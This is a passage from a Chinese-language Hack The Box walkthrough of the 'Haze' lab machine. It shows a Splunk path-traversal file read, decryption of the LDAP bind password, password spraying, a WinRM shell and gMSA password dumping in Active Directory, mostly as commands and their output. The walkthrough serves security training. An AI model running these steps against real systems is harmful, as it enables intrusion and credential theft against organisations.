class=\"hljs-variable\"\u003e$Oa\u003c/span\u003e/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152\n:paul:$6$Y5ds8NjDLd7SzOTW\u003cspan class=\"hljs-variable\"\u003e$Zg\u003c/span\u003e/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003esplunk/etc/system/local/authentication.conf\u003c/code\u003e\n其中 \u003ccode\u003ebindDN\u003c/code\u003e 是 \u003ccode\u003ePaul Taylor\u003c/code\u003e，并且 \u003ccode\u003ebindDNpassword\u003c/code\u003e 是加密的 \u003ccode\u003e$7$\u003c/code\u003e 格式（ GPT 说是 Splunk 的 \u003ccode\u003epass4SymmKey\u003c/code\u003e 加密）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze  curl \u003cspan class=\"hljs-string\"\u003e\"http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/splunk/etc/system/local/authentication.conf\"\u003c/span\u003e\n[splunk_auth]\nminPasswordLength = 8\nminPasswordUppercase = 0\nminPasswordLowercase = 0\nminPasswordSpecial = 0\nminPasswordDigit = 0\n\n[Haze LDAP Auth]\nSSLEnabled = 0\nanonymous_referrals = 1\nbindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb\nbindDNpassword = $7\u003cspan class=\"hljs-variable\"\u003e$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN\u003c/span\u003e+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=\ncharset = utf8\nemailAttribute = mail\nenableRangeRetrieval = 0\ngroupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb\ngroupMappingAttribute = dn\ngroupMemberAttribute = member\ngroupNameAttribute = cn\nhost = dc01.haze.htb\nnestedGroups = 0\nnetwork_timeout = 20\npagelimit = -1\nport = 389\nrealNameAttribute = cn\nsizelimit = 1000\ntimelimit = 15\nuserBaseDN = CN=Users,DC=haze,DC=htb\nuserNameAttribute = samaccountname\n\n[authentication]\nauthSettings = Haze LDAP Auth\nauthType = LDAP\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003esplunk/etc/auth/splunk.secret\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e通过对关键字“Splunk Secret” 的搜索，搜索到了：\u003ca href=\"https://community.splunk.com/t5/Knowledge-Management/What-is-the-splunk-secret-file-and-is-it-possible-to-change-it/m-p/331207\"\u003ehttps://community.splunk.com/t5/Knowledge-Management/What-is-the-splunk-secret-file-and-is-it-possible-to-change-it/m-p/331207\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eThe splunk.secret file is located in the \u003ccode\u003e$SPLUNK_HOME/etc/auth\u003c/code\u003e directory. It is used to encrypt and decrypt the passwords in the Splunk configuration files.\nsplunk.secret 文件位于 \u003ccode\u003e$SPLUNK_HOME/etc/auth\u003c/code\u003e 目录中。它用于加密和解密 Splunk 配置文件中的密码。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze  curl \u003cspan class=\"hljs-string\"\u003e\"http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/splunk/etc/auth/splunk.secret\"\u003c/span\u003e      \nNfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD#   \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eSplunk.Secret\u003c/h2\u003e\n\u003cp\u003e在 \u003ccode\u003eGitHub\u003c/code\u003e 对其该关键字进行搜索找到一个工具：\u003ca href=\"https://github.com/HurricaneLabs/splunksecrets\"\u003ehttps://github.com/HurricaneLabs/splunksecrets\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003esplunksecrets is a tool for working with Splunk secrets offline\u003c/p\u003e\n\u003cp\u003esplunksecrets 是一种用于离线使用 Splunk 密钥的工具\u003c/p\u003e\n\u003cp\u003e将\u003ccode\u003eSplunk.Secret\u003c/code\u003e保存到本地，使用\u003ccode\u003esplunksecrets\u003c/code\u003e进行破解\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze  splunksecrets splunk-decrypt -S splunk.secret --ciphertext \u003cspan class=\"hljs-string\"\u003e'$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY='\u003c/span\u003e \nLd@p_Auth_Sp1unk@2k24\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到密码\u003ccode\u003eLd@p_Auth_Sp1unk@2k24\u003c/code\u003e\u003c/p\u003e\n\u003ch2\u003e枚举\u003c/h2\u003e\n\u003cp\u003e拿到密码后进行枚举\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze  nxc smb 10.10.11.61 -u paul.taylor -p \u003cspan class=\"hljs-string\"\u003e'Ld@p_Auth_Sp1unk@2k24'\u003c/span\u003e\nSMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.61     445    DC01             [+] haze.htb\\paul.taylor:Ld@p_Auth_Sp1unk@2k24 \n ⚡ root@kali  ~/Desktop/test/Haze  nxc ldap 10.10.11.61 -u paul.taylor -p \u003cspan class=\"hljs-string\"\u003e'Ld@p_Auth_Sp1unk@2k24'\u003c/span\u003e\nSMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)\nLDAP        10.10.11.61     389    DC01             [+] haze.htb\\paul.taylor:Ld@p_Auth_Sp1unk@2k24 \n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       10.10.11.61     5985   DC01             [-] haze.htb\\paul.taylor:Ld@p_Auth_Sp1unk@2k24\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze  smbclient -L dc01.haze.htb -U dc01.haze.htb/paul.taylor%\u003cspan class=\"hljs-string\"\u003e'Ld@p_Auth_Sp1unk@2k24'\u003c/span\u003e --option=\u003cspan class=\"hljs-string\"\u003e'client min protocol=SMB2'\u003c/span\u003e  \n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share \nSMB1 disabled -- no workgroup available\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eSMB\u003c/code\u003e找不到任何信息\u003c/p\u003e\n\u003cp\u003e上面\u003ccode\u003eLDAP\u003c/code\u003e验证也是过的，我们直接使用\u003ccode\u003eBloodHound\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze  bloodhound-python -u \u003cspan class=\"hljs-string\"\u003e'paul.taylor'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Ld@p_Auth_Sp1unk@2k24'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e'haze.htb'\u003c/span\u003e -ns 10.10.11.61 --zip -c All -dc \u003cspan class=\"hljs-string\"\u003e'dc01.haze.htb'\u003c/span\u003e\nINFO: Found AD domain: haze.htb\nINFO: Getting TGT \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\nINFO: Connecting to LDAP server: dc01.haze.htb\nINFO: Found 1 domains\nINFO: Found 1 domains \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: dc01.haze.htb\nINFO: Found 3 \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\nINFO: Found 32 \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e\nINFO: Found 2 gpos\nINFO: Found 2 ous\nINFO: Found 18 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: dc01.haze.htb\nINFO: Done \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 01M 01S\nINFO: Compressing output into 20250331033810_bloodhound.zip\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003eBloodHound\u003c/code\u003e进行分析\u003c/p\u003e\n\u003cp\u003ePaul是\u003ccode\u003eRESTRICTED USERS@HAZE.HTB\u003c/code\u003e组的成员，受限用户，并且只能找到三个用户\u003ccode\u003epaul.taylor\u003c/code\u003e，\u003ccode\u003eHaze-IT-Backup$\u003c/code\u003e ，\u003ccode\u003edc01$\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Haze/image65.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e对域进行用户名枚举，任何再对其进行密码喷洒，因为之前还得到了\u003ccode\u003eMARK\u003c/code\u003e和\u003ccode\u003eEdward\u003c/code\u003e 等用户，但是名不全没办法进行利用\u003c/p\u003e\n\u003cp\u003e字典来自于：\u003ca href=\"https://github.com/zer0yu/Berserker\"\u003ehttps://github.com/zer0yu/Berserker\u003c/a\u003e （试了好多字典）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/Tools  ./kerbrute_linux_amd64 userenum --dc 10.10.11.61 -d haze.htb ~/Desktop/test/Haze/Berserker/brute/common/username/usernames_5000.txt \n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,\u0026#x3C; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: dev () - 03/31/25 - Ronnie Flathers @ropnop\n\n2025/03/31 04:16:53 \u003e  Using KDC(s):\n2025/03/31 04:16:53 \u003e   10.10.11.61:88\n\n2025/03/31 04:17:33 \u003e  [+] VALID USERNAME:       paul.taylor@haze.htb\n2025/03/31 04:18:03 \u003e  [+] VALID USERNAME:       edward.martin@haze.htb\n2025/03/31 04:20:39 \u003e  [+] VALID USERNAME:       mark.adams@haze.htb\n2025/03/31 04:22:59 \u003e  Done! Tested 5000 usernames (3 valid) \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 365.646 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到三个用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epaul.taylor\nedward.martin\nmark.adams\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再次进行枚举\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze  nxc smb 10.10.11.61 -u users.txt -p \u003cspan class=\"hljs-string\"\u003e'Ld@p_Auth_Sp1unk@2k24'\u003c/span\u003e\nSMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.61     445    DC01             [+] haze.htb\\paul.taylor:Ld@p_Auth_Sp1unk@2k24 \n⚡ root@kali  ~/Desktop/test/Haze  nxc winrm 10.10.11.61 -u users.txt -p \u003cspan class=\"hljs-string\"\u003e'Ld@p_Auth_Sp1unk@2k24'\u003c/span\u003e\nWINRM       10.10.11.61     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       10.10.11.61     5985   DC01             [-] haze.htb\\paul.taylor:Ld@p_Auth_Sp1unk@2k24\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       10.10.11.61     5985   DC01             [-] haze.htb\\edward.martin:Ld@p_Auth_Sp1unk@2k24\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       10.10.11.61     5985   DC01             [+] haze.htb\\mark.adams:Ld@p_Auth_Sp1unk@2k24 (Pwn3d!)\n⚡ root@kali  ~/Desktop/test/Haze  nxc ldap 10.10.11.61 -u users.txt -p \u003cspan class=\"hljs-string\"\u003e'Ld@p_Auth_Sp1unk@2k24'\u003c/span\u003e\nSMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)\nLDAP        10.10.11.61     389    DC01             [+] haze.htb\\paul.taylor:Ld@p_Auth_Sp1unk@2k24 \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003emark.adams\u003c/code\u003e 拥有 \u003ccode\u003ewinrm\u003c/code\u003e  的凭据，使用\u003ccode\u003eevil-winrm\u003c/code\u003e进行登录\u003c/p\u003e\n\u003cp\u003e登陆成功\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze  evil-winrm -i 10.10.11.61 -u mark.adams -p \u003cspan class=\"hljs-string\"\u003e'Ld@p_Auth_Sp1unk@2k24'\u003c/span\u003e\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e域内信息收集\u003c/h2\u003e\n\u003cp\u003e上传\u003ccode\u003eSharpHound\u003c/code\u003e进行域内信息收集\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents\u003e upload ../../Tools/BloodHound-linux-x64/resources/app/Collectors/SharpHound.exe                                                          \n                                        \nInfo: Uploading /root/Desktop/test/Haze/../../Tools/BloodHound-linux-x64/resources/app/Collectors/SharpHound.exe to C:\\Users\\mark.adams\\Documents\\SharpHound.exe\n                                        \nData: 1395368 bytes of 1395368 bytes copied\n                                        \nInfo: Upload successful!\n\n*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents\u003e ./SharpHound.exe -c all\n2025-03-31T09:22:29.6650145-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound\n2025-03-31T09:22:29.7900186-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote\n2025-03-31T09:22:29.8056473-07:00|INFORMATION|Initializing SharpHound at 9:22 AM on 3/31/2025\n2025-03-31T09:22:29.9150180-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e haze.htb : dc01.haze.htb\n2025-03-31T09:22:30.0557183-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote\n2025-03-31T09:22:30.1650235-07:00|INFORMATION|Beginning LDAP search \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e haze.htb\n2025-03-31T09:22:30.1962697-07:00|INFORMATION|Producer has finished, closing LDAP channel\n2025-03-31T09:22:30.2119118-07:00|INFORMATION|LDAP channel closed, waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e consumers\n2025-03-31T09:23:00.3681410-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 37 MB RAM\n2025-03-31T09:23:14.7118901-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e haze.htb : dc01.haze.htb\n2025-03-31T09:23:14.9306620-07:00|INFORMATION|Consumers finished, closing output channel\nClosing writers\n2025-03-31T09:23:14.9618914-07:00|INFORMATION|Output channel closed, waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e output task to complete\n2025-03-31T09:23:15.0087652-07:00|INFORMATION|Status: 100 objects finished (+100 2.272727)/s -- Using 45 MB RAM\n2025-03-31T09:23:15.0087652-07:00|INFORMATION|Enumeration finished \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 00:00:44.8366245\n2025-03-31T09:23:15.0556437-07:00|INFORMATION|Saving cache with stats: 60 ID to \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e mappings.\n 59 name to SID mappings.\n 0 machine sid mappings.\n 2 sid to domain mappings.\n 0 global catalog mappings.\n2025-03-31T09:23:15.0712709-07:00|INFORMATION|SharpHound Enumeration Completed at 9:23 AM on 3/31/2025! Happy Graphing!\n\n*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents\u003e download 20250331092314_BloodHound.zip\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eBloodHound 分析\u003c/p\u003e\n\u003cp\u003emark 属于 \u003ccode\u003eDomain users\u003c/code\u003e，\u003ccode\u003eGMSA_managers\u003c/code\u003e，\u003ccode\u003eREMOTE_managent_users\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Haze/image66.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Haze/image67.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eGMSA 组利用 \u0026#x26; 域分析\u003c/h2\u003e\n\u003cp\u003e查看组\u003ccode\u003eGMSA_managers\u003c/code\u003e的权限\u003c/p\u003e\n\u003cp\u003e如果 \u003ccode\u003eGMSA_managers\u003c/code\u003e 具有读取 gMSA 密码的权限，可以尝试 \u003cstrong\u003e获取 gMSA 账户的密码\u003c/strong\u003e，然后使用该账户进行访问。\u003c/p\u003e\n\u003cp\u003e查看域中所有\u003ccode\u003egMSA\u003c/code\u003e账户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\program files\u003e Get-ADServiceAccount -Filter *  \n                                                               \nDistinguishedName : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb\nEnabled           : True                       \nName              : Haze-IT-Backup                  \nObjectClass       : msDS-GroupManagedServiceAccount  \nObjectGUID        : 66f8d593-2f0b-4a56-95b4-01b326c7a780\nSamAccountName    : Haze-IT-Backup$ \nSID               : S-1-5-21-323145914-28650650-2368316563-1111\nUserPrincipalName :      \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e检查可访问\u003ccode\u003egMAS\u003c/code\u003e账户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\program files\u003e Get-ADServiceAccount -Filter * | Select-Object Name,DistinguishedName  \n\nName           DistinguishedName\n----           -----------------\nHaze-IT-Backup CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看一下 \u003cstrong\u003e\u003ccode\u003eHaze-IT-Backup\u003c/code\u003e\u003c/strong\u003e gMSA 允许哪些用户读取密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\program files\u003e Get-ADServiceAccount -Identity \u003cspan class=\"hljs-string\"\u003e\"Haze-IT-Backup\"\u003c/span\u003e -Properties PrincipalsAllowedToRetrieveManagedPassword\n\nDistinguishedName                          : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb\nEnabled                                    : True\nName                                       : Haze-IT-Backup\nObjectClass                                : msDS-GroupManagedServiceAccount\nObjectGUID                                 : 66f8d593-2f0b-4a56-95b4-01b326c7a780\nPrincipalsAllowedToRetrieveManagedPassword : {CN=Domain Admins,CN=Users,DC=haze,DC=htb}\nSamAccountName                             : Haze-IT-Backup$\nSID                                        : S-1-5-21-323145914-28650650-2368316563-1111\nUserPrincipalName                          :\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e只允许\u003ccode\u003eDomain Admins\u003c/code\u003e 组的用户\u003c/p\u003e\n\u003cp\u003e思路断了，根据提示，\u003ccode\u003eMARK\u003c/code\u003e用户拥有修改**\u003ccode\u003ePrincipalsAllowedToRetrieveManagedPassword\u003c/code\u003e** 的权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\program files\u003e Set-ADServiceAccount -Identity Haze-IT-Backup$ -PrincipalsAllowedToRetrieveManagedPassword \u003cspan class=\"hljs-string\"\u003e\"mark.adams\"\u003c/span\u003e\n*Evil-WinRM* PS C:\\program files\u003e Get-ADServiceAccount -Identity Haze-IT-Backup$ -Properties PrincipalsAllowedToRetrieveManagedPassword\n\nDistinguishedName                          : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb\nEnabled                                    : True\nName                                       : Haze-IT-Backup\nObjectClass                                : msDS-GroupManagedServiceAccount\nObjectGUID                                 : 66f8d593-2f0b-4a56-95b4-01b326c7a780\nPrincipalsAllowedToRetrieveManagedPassword : {CN=Mark Adams,CN=Users,DC=haze,DC=htb}\nSamAccountName                             : Haze-IT-Backup$\nSID                                        : S-1-5-21-323145914-28650650-2368316563-1111\nUserPrincipalName      \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e设置后通过\u003ccode\u003egMASDumper\u003c/code\u003e来获取\u003ccode\u003eHaze-IT-Backup$\u003c/code\u003e密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze/gMSADumper  python3 gMSADumper.py -u mark.adams -p \u003cspan class=\"hljs-string\"\u003e'Ld@p_Auth_Sp1unk@2k24'\u003c/span\u003e -d haze.htb -l haze.htb\nUsers or \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ewho\u003c/span\u003e can \u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e Haze-IT-Backup$:\n \u003e mark.adams\nHaze-IT-Backup$:::735c02c6b2dc54c3c8c6891f55279ebc\nHaze-IT-Backup$:aes256-cts-hmac-sha1-96:38c90a95f7e038a6cb57d3e21c405c2875e88f1edbb1e082f1dd75d01eda60fd\nHaze-IT-Backup$:aes128-cts-hmac-sha1-96:0926f5e64d85018a506ecadff3df4f95\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ePS：哪里可以知道\u003ccode\u003eMARK\u003c/code\u003e 拥有修改**\u003ccode\u003ePrincipalsAllowedToRetrieveManagedPassword\u003c/code\u003e** 的权限？\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\\u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\\mark.adams\\documents\u003e Import-Module .\\PowerView.ps1\n*Evil-WinRM* PS C:\\\u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\\mark.adams\\documents\u003e Find-InterestingDomainAcl -ResolveGUIDs\n\nObjectDN                : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb\nAceQualifier            : AccessAllowed\nActiveDirectoryRights   : WriteProperty\nObjectAceType           : ms-DS-GroupMSAMembership\nAceFlags                : None\nAceType                 : AccessAllowedObject\nInheritanceFlags        : None\nSecurityIdentifier      : S-1-5-21-323145914-28650650-2368316563-1107\nIdentityReferenceName   : gMSA_Managers\nIdentityReferenceDomain : haze.htb\nIdentityReferenceDN     : CN=gMSA_Managers,CN=Users,DC=haze,DC=htb\nIdentityReferenceClass  : group\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e还能看到\u003ccode\u003eHaze-IT-Backup$\u003c/code\u003e对\u003ccode\u003eSupport_Services\u003c/code\u003e拥有\u003ccode\u003eWriteOwner\u003c/code\u003e权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eObjectDN                : CN=Support_Services,CN=Users,DC=haze,DC=htb\nAceQualifier            : AccessAllowed\nActiveDirectoryRights   : WriteOwner\nObjectAceType           : None\nAceFlags                : None\nAceType                 : AccessAllowed\nInheritanceFlags        : None\nSecurityIdentifier      : S-1-5-21-323145914-28650650-2368316563-1111\nIdentityReferenceName   : Haze-IT-Backup$\nIdentityReferenceDomain : haze.htb\nIdentityReferenceDN     : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb\nIdentityReferenceClass  : computer\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e从\u003ccode\u003eBloodHound\u003c/code\u003e中也能看出来\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Haze/image68.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003eHaze-IT-Backup$\u003c/code\u003e 获得的哦凭据来使用\u003ccode\u003eBloodHound\u003c/code\u003e来收集信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze/gMSADumper  bloodhound-python -u \u003cspan class=\"hljs-string\"\u003e'Haze-IT-Backup$'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e'haze.htb'\u003c/span\u003e -ns 10.10.11.61 --zip -c All -dc \u003cspan class=\"hljs-string\"\u003e'dc01.haze.htb'\u003c/span\u003e --hashes \u003cspan class=\"hljs-string\"\u003e'0926f5e64d85018a506ecadff3df4f95:735c02c6b2dc54c3c8c6891f55279ebc'\u003c/span\u003e\nINFO: Found AD domain: haze.htb\nINFO: Getting TGT \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\nINFO: Connecting to LDAP server: dc01.haze.htb\nINFO: Found 1 domains\nINFO: Found 1 domains \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: dc01.haze.htb\nINFO: Found 9 \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\nINFO: Found 57 \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e\nINFO: Found 2 gpos\nINFO: Found 2 ous\nINFO: Found 20 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: dc01.haze.htb\nINFO: Done \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 00M 17S\nINFO: Compressing output into 20250331073045_bloodhound.zip\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e有一条路径可以修改\u003ccode\u003eEDWARD.MARTIN\u003c/code\u003e 的密码（失败的尝试）\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Haze/image69.png\" 